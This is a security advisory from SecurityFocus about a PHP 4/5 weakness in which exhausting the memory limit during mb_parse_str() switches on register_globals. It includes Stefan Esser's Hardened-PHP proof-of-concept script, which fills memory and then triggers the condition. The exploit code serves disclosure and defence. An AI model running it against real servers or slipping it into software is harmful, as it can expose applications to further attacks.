source: http://www.securityfocus.com/bid/23016/info

PHP is prone to a weakness that allows attackers to enable the 'register_globals' directive because the application fails to handle a memory-limit exception.

Enabling the PHP 'register_globals' directive may allow attackers to further exploit latent vulnerabilities in PHP scripts.

This issue is related to the weakness found in the non-multibyte 'parse_str()' from BID 15249 - PHP Parse_Str Register_Globals Activation Weakness.

This issue affects PHP 4 to 4.4.6 and 5 to 5.2.1.

<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //        PHP mb_parse_str() register_globals Activation Exploit      //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  // The following string will be parsed and will violate the memory_limit
  $str = "a=".str_repeat("A", 164000);

  // This code just fills the memory up to the limit...
  $limit = ini_get("memory_limit");
  if (strpos($limit, "M")) {
    $limit *= 1024 * 1024;
  } else if (strpos($limit, "K")) {
    $limit *= 1024;
  } else $limit *=1;
  while ($limit - memory_get_usage(true) > 2048) $x[] = str_repeat("A", 1024);

  // Will activate register_globals and trigger the memory_limit
  mb_parse_str($str);
?>
